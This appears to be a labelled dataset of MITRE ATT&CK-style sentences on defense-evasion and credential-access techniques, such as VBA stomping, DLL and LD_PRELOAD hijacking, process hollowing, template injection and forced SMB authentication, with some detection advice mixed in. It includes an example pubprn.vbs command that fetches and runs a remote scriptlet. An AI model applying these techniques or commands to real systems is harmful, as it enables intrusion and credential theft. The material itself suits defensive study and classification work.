They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it.,TA0005,T1140
Methods for doing that include built-in functionality of malware or by using utilities present on the system.,TA0005,T1140

"In doing so, adversaries can hide the presence of malicious components and file input/output from security tools.",TA0005,T1564.005
"Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways.",TA0005,T1564.005
One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.,TA0005,T1564.005
Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.,TA0005,T1564.005

Adversaries may carry out malicious operations using a virtual instance to avoid detection.,TA0005,T1564.006
A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment.,TA0005,T1564.006
"By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.",TA0005,T1564.006
"Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.",TA0005,T1564.006
Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries).,TA0005,T1564.006
"After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.",TA0005,T1564.006

"Similarly, monitoring command line arguments which suppress notifications may highlight potentially malicious activity ( VBoxManage.exe setextradata global GUI/SuppressMessages ""all"").",TA0005,T1564.006
Monitor for commands which enable hypervisors such as Hyper-V.,TA0005,T1564.006

"For example, if virtualization software is installed by the adversary the Registry may provide detection opportunities.",TA0005,T1564.006
Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.,TA0005,T1564.007
MS Office documents with embedded VBA content store source code inside of module streams.,TA0005,T1564.007
Each module stream has a PerformanceCache that stores a separate compiled version of the VBA source code known as p-code.,TA0005,T1564.007
The p-code is executed when the MS Office version specified in the _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.,TA0005,T1564.007
"An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code.",TA0005,T1564.007
Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code.,TA0005,T1564.007
"If the VBA source code is removed, some tools might even think that there are no macros present.",TA0005,T1564.007
"If there is a version match between the _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.",TA0005,T1564.007
If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed.,TA0005,T1564.007
"However, if the PROJECT stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed.",TA0005,T1564.007
"For example, adding a module name that is undefined to the PROJECT stream will inhibit attempts of reading the VBA source code through the GUI.",TA0005,T1564.007
Detection efforts should be placed finding differences between VBA source code and p-code.,TA0005,T1564.007
VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler.,TA0005,T1564.007
The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.,TA0005,T1564.007
Adversaries may use email rules to hide inbound emails in a compromised user's mailbox.,TA0005,T1564.008
"Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails.",TA0005,T1564.008
Rules may be created or modified within email clients or through external features such as the New-InboxRule or Set-InboxRule PowerShell cmdlets on Windows systems.,TA0005,T1564.008
Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders.,TA0005,T1564.008
"Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.",TA0005,T1564.008
Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails.,TA0005,T1564.008
These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender.,TA0005,T1564.008
"Malicious rules commonly filter out emails based on key words (such as malware, suspicious, phish, and hack) found in message bodies and subject lines.",TA0005,T1564.008
"FIN4 has created rules in victims' Microsoft Outlook accounts to automatically delete emails containing words such as ""hacked,"" ""phish,"" and ""malware"" in a likely attempt to prevent organizations from communicating about their activities.",TA0005,T1564.008
Enterprise email solutions may have monitoring mechanisms that may include the ability to audit inbox rules on a regular basis.,TA0005,T1564.008
"In an Exchange environment, Administrators can use Get-InboxRule to discover and remove potentially malicious inbox rules.",TA0005,T1564.008

"On MacOS systems, monitor for modifications to the RulesActiveState.plist, SyncedRules.plist, UnsyncedRules.plist, and MessageRules.plist files.",TA0005,T1564.008
Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications.,TA0005,T1564.009
"A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.",TA0005,T1564.009
"Usage of a resource fork is identifiable when displaying a file’s extended attributes, using ls -l@ or xattr -l commands.",TA0005,T1564.009
Resource forks have been deprecated and replaced with the application bundle structure.,TA0005,T1564.009
"Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder.",TA0005,T1564.009
Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files.,TA0005,T1564.009
"Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked.",TA0005,T1564.009
Resource fork content may also be obfuscated/encrypted until execution.,TA0005,T1564.009

Monitor newly executed processes that may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications.,TA0005,T1564.009
Adversaries may attempt to hide process command-line arguments by overwriting process memory.,TA0005,T1564.010
"Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process.",TA0005,T1564.010
The PEB includes the process command-line arguments that are referenced when executing the process.,TA0005,T1564.010
"When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.",TA0005,T1564.010
Adversaries may manipulate a process PEB to evade defenses.,TA0005,T1564.010
"For example, Process Hollowing can be abused to spawn a process in a suspended state with benign arguments.",TA0005,T1564.010
"After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API WriteProcessMemory() function) then resume process execution with malicious arguments.",TA0005,T1564.010
Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.,TA0005,T1564.010
This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections.,TA0005,T1564.010
Cobalt Strike can use spoof arguments in spawned processes that execute beacon commands.,TA0005,T1564.010
SombRAT has the ability to modify its process memory to hide process command-line arguments.,TA0005,T1564.010
Analyze process behavior to determine if a process is performing actions it usually does not and/or do no align with its logged command-line arguments.,TA0005,T1564.010
Detection of process argument spoofing may be difficult as adversaries may momentarily modify stored arguments used for malicious execution.,TA0005,T1564.010
These changes may bypass process creation detection and/or later process memory analysis.,TA0005,T1564.010
"Consider monitoring for Process Hollowing, which includes monitoring for process creation (especially those in a suspended state) as well as access and/or modifications of these processes (especially by the parent process) via Windows API calls.",TA0005,T1564.010
Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs.,TA0005,T1574
"Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time.",TA0005,T1574
"Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.",TA0005,T1574
"There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed.",TA0005,T1574
How the operating system locates libraries to be used by a program can also be intercepted.,TA0005,T1574
"Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",TA0005,T1574

"Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL.",TA0005,T1574.001
Often this location is the current working directory of the program.,TA0005,T1574.001
Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.,TA0005,T1574.001
"Adversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.",TA0005,T1574.001
"If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level.",TA0005,T1574.001
"In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.",TA0005,T1574.001

These processes may automatically execute specific binaries as part of their functionality or to perform other actions.,TA0005,T1574.005
"If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process.",TA0005,T1574.005
"If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.",TA0005,T1574.005
"Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers.",TA0005,T1574.005
"During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads.",TA0005,T1574.005
"When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process.",TA0005,T1574.005
This behavior is related to and may take advantage of DLL Search Order Hijacking.,TA0005,T1574.005
Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level.,TA0005,T1574.005
Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code.,TA0005,T1574.005

Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries.,TA0005,T1574.006
"During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as LD_PRELOAD on Linux or DYLD_INSERT_LIBRARIES on macOS.",TA0005,T1574.006
"Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.",TA0005,T1574.006
"These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.",TA0005,T1574.006
"On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges.",TA0005,T1574.006
This method may also evade detection from security products since the execution is masked under a legitimate process.,TA0005,T1574.006
"Adversaries can set environment variables via the command line using the export command, setenv function, or putenv function.",TA0005,T1574.006
Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s os.environ.,TA0005,T1574.006
"On Linux, adversaries may set LD_PRELOAD to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program.",TA0005,T1574.006
LD_PRELOAD can be set via the environment variable or /etc/ld.so.preload file.,TA0005,T1574.006
Libraries specified by LD_PRELOAD are loaded and mapped into memory by dlopen() and mmap() respectively.,TA0005,T1574.006

Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR.,TA0005,T1574.012
The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).,TA0005,T1574.012
"These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.",TA0005,T1574.012
"The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence.",TA0005,T1574.012
"System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL.",TA0005,T1574.012
A process scope COR_PROFILER can also be created in-memory without modifying the Registry.,TA0005,T1574.012
"Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.",TA0005,T1574.012
Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked.,TA0005,T1574.012
"The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes.",TA0005,T1574.012

Adversaries may abuse the KernelCallbackTable of a process to hijack its execution flow in order to run their own payloads.,TA0005,T1574.013
The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded.,TA0005,T1574.013
An adversary may hijack the execution flow of a process using the KernelCallbackTable by replacing an original callback function with a malicious payload.,TA0005,T1574.013
Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process.,TA0005,T1574.013
A pointer to the memory address of the KernelCallbackTable can be obtained by locating the PEB (ex: via a call to the NtQueryInformationProcess() Native API function).,TA0005,T1574.013
"Once the pointer is located, the KernelCallbackTable can be duplicated, and a function in the table (, fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory()).",TA0005,T1574.013
The PEB is then updated with the new address of the table.,TA0005,T1574.013
"Once the tampered function is invoked, the malicious payload will be triggered.",TA0005,T1574.013
The tampered function is typically invoked using a Windows message.,TA0005,T1574.013
"After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload.",TA0005,T1574.013
Use of the KernelCallbackTable to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.,TA0005,T1574.013
FinFisher has used the KernelCallbackTable to hijack the execution flow of a process by replacing the __fnDWORD function with the address of a created Asynchronous Procedure Call stub routine.,TA0005,T1574.013
Lazarus Group has abused the KernelCallbackTable to hijack process control flow and execute shellcode.,TA0005,T1574.013

Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation.,TA0005,T1599
Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,TA0005,T1599
Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.,TA0005,T1599
They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.,TA0005,T1599
"Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.",TA0005,T1599
"To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.",TA0005,T1599
"When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.",TA0005,T1599
"By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication.",TA0005,T1599
Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.,TA0005,T1599
"In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",TA0005,T1599

Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration.,TA0005,T1599.001
Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.,TA0005,T1599.001
Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks.,TA0005,T1599.001
"When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header.",TA0005,T1599.001
Some network designs require NAT for the packets to cross the border device.,TA0005,T1599.001
A typical example of this is environments where internal networks make use of non-Internet routable addresses.,TA0005,T1599.001

Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.,TA0005,T1055.009
Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.,TA0005,T1055.009
"Each running process has its own directory, which includes memory mappings.",TA0005,T1055.009
Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.,TA0005,T1055.009
This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR).,TA0005,T1055.009
"Once enumerated, the target processes’ memory map within /proc/[pid]/maps can be overwritten using dd.",TA0005,T1055.009

Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges.,TA0005,T1055.011
EWM injection is a method of executing arbitrary code in the address space of a separate live process.,TA0005,T1055.011
"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).",TA0005,T1055.011
Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class.,TA0005,T1055.011
This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.,TA0005,T1055.011
"Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure.",TA0005,T1055.011
"Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.",TA0005,T1055.011
Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.,TA0005,T1055.011
Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.,TA0005,T1055.011
More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.,TA0005,T1055.011
"Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",TA0005,T1055.011

Process hollowing is a method of executing arbitrary code in the address space of a separate live process.,TA0005,T1055.012
"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code.",TA0005,T1055.012
"A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread.",TA0005,T1055.012
"At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection  before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",TA0005,T1055.012
This is very similar to Thread Local Storage but creates a new process rather than targeting an existing process.,TA0005,T1055.012
This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process.,TA0005,T1055.012

Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.,TA0005,T1055.013
"To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time.",TA0005,T1055.013

"MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins.",TA0005,T1218.014
These snap-ins may be used to manage Windows systems locally or remotely.,TA0005,T1218.014
MMC can also be used to open Microsoft created .msc files to manage system configuration.,TA0005,T1218.014
"For example, mmc C:\Users\foo\admintools.msc /a will open a custom, saved console msc file in author mode.",TA0005,T1218.014
"Another common example is mmc gpedit.msc, which will open the Group Policy Editor application window.",TA0005,T1218.014

Adversaries may use PubPrn to proxy execution of malicious remote files.,TA0005,T1216.001
PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services.,TA0005,T1216.001
The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe.,TA0005,T1216.001
"For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.",TA0005,T1216.001
Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.,TA0005,T1216.001
"To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site.",TA0005,T1216.001
An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct.,TA0005,T1216.001
This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.,TA0005,T1216.001
"In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site.",TA0005,T1216.001

Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts.,TA0005,T1221
"For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt).",TA0005,T1221
"OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.",TA0005,T1221
Properties within parts may reference shared public resources accessed via online URLs.,TA0005,T1221
"For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.",TA0005,T1221
Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents.,TA0005,T1221
Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.,TA0005,T1221
"These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, ) are present until after the malicious payload is fetched.",TA0005,T1221
Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.,TA0005,T1221
Adversaries may also modify the *\template control word within an .rtf file to similarly conceal then download malicious code.,TA0005,T1221
This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened.,TA0005,T1221
"However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.",TA0005,T1221
This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.,TA0005,T1221

"Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: PowerShell), or other suspicious actions that could relate to post-compromise behavior.",TA0005,T1221
Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control.,TA0005,T1205
"Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task.",TA0005,T1205
This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.,TA0005,T1205
"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports ( Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics.",TA0005,T1205
"After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.",TA0005,T1205
"Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).",TA0005,T1205
The observation of the signal packets to trigger the communication can be conducted through different methods.,TA0005,T1205
"One means, originally implemented by Cd00r , is to use the libpcap libraries to sniff for the packets in question.",TA0005,T1205
"Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",TA0005,T1205
"On network devices, adversaries may use crafted packets to enable Network Device Authentication for standard services offered by the device such as telnet.",TA0005,T1205
"Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.",TA0005,T1205
"Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.",TA0005,T1205

"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.",TA0005,T1127
These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.,TA0005,T1127
Monitor executed commands and arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.,TA0005,T1127

Adversaries may create cloud instances in unused geographic service regions in order to evade detection.,TA0005,T1535
Access is usually obtained through compromising accounts used to manage cloud infrastructure.,TA0005,T1535
"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements.",TA0005,T1535
"Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions.",TA0005,T1535
"If an adversary creates resources in an unused region, they may be able to operate undetected.",TA0005,T1535
A variation on this behavior takes advantage of differences in functionality across cloud regions.,TA0005,T1535
An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.,TA0005,T1535
"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.",TA0005,T1535

"Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.",TA0005,T1550
"Authentication processes generally require a valid identity (, username) along with one or more authentication factors (, password, pin, physical smart card, token generator, ).",TA0005,T1550
Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s).,TA0005,T1550
Alternate authentication material may also be generated during the identity creation process.,TA0005,T1550
Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s).,TA0005,T1550
Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques.,TA0005,T1550

Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.,TA0005,T1600
Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes).,TA0005,T1600
Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key.,TA0005,T1600

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control.,TA0005,T1220
"Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.",TA0005,T1220
"Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.",TA0005,T1220

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification.,TA0006,T1557.001
LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts.,TA0006,T1557.001
NBT-NS identifies systems on a local network by their NetBIOS name.,TA0006,T1557.001
"Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system.",TA0006,T1557.001
"If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system.",TA0006,T1557.001
The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.,TA0006,T1557.001
"In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system.",TA0006,T1557.001

Adversaries may exploit software vulnerabilities in an attempt to collect credentials.,TA0006,T1212
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",TA0006,T1212
Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems.,TA0006,T1212
"One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.",TA0006,T1212

Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.,TA0006,T1212
Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.,TA0006,T1187
The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing.,TA0006,T1187
When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.,TA0006,T1187
This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.,TA0006,T1187
Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails.,TA0006,T1187
WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.,TA0006,T1187
Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication.,TA0006,T1187
"An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary ( Template Injection), or place a specially crafted file on navigation path for privileged accounts ( .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s).",TA0006,T1187
"When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.",TA0006,T1187
"With access to the credential hash, an adversary can perform off-line Brute Force cracking to gain access to plaintext credentials.",TA0006,T1187
There are several different ways this can occur.,TA0006,T1187
Some specifics from in-the-wild use include:,TA0006,T1187
"A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened ( Template Injection). The document can include, for example, a request similar to file[:]//[remote address]/Normal.dotm to trigger the SMB request.",TA0006,T1187
A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \[remote address]\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.,TA0006,T1187
DarkHydrus used Template Injection to launch an authentication window for users to enter their credentials.,TA0006,T1187
Dragonfly has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.,TA0006,T1187
EnvyScout can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.,TA0006,T1187
"Block SMB traffic from exiting an enterprise network with egress filtering or by blocking TCP ports 139, 445 and UDP port 137.",TA0006,T1187
Filter or block WebDAV protocol traffic from exiting the network.,TA0006,T1187
"If access to external resources over SMB and WebDAV is necessary, then traffic should be tightly limited with allowlisting.",TA0006,T1187
Use strong passwords to increase the difficulty of credential hashes from being cracked if they are obtained.,TA0006,T1187
Monitor for unexpected files used to gather credentials when the files are rendered,TA0006,T1187
"Monitor for newly constructed .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources",TA0006,T1187
"Monitor for changes made to the .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources",TA0006,T1187
"For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic.",TA0006,T1187
"For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.",TA0006,T1187
"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems.If attempts are detected, then investigate endpoint data sources to find the root cause.",TA0006,T1187
Adversaries may forge credential materials that can be used to gain access to web applications or Internet services.,TA0006,T1606
"Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.",TA0006,T1606

Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.,TA0006,T1528
Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).,TA0006,T1528
OAuth is one commonly implemented framework that issues tokens to users for access to systems.,TA0006,T1528
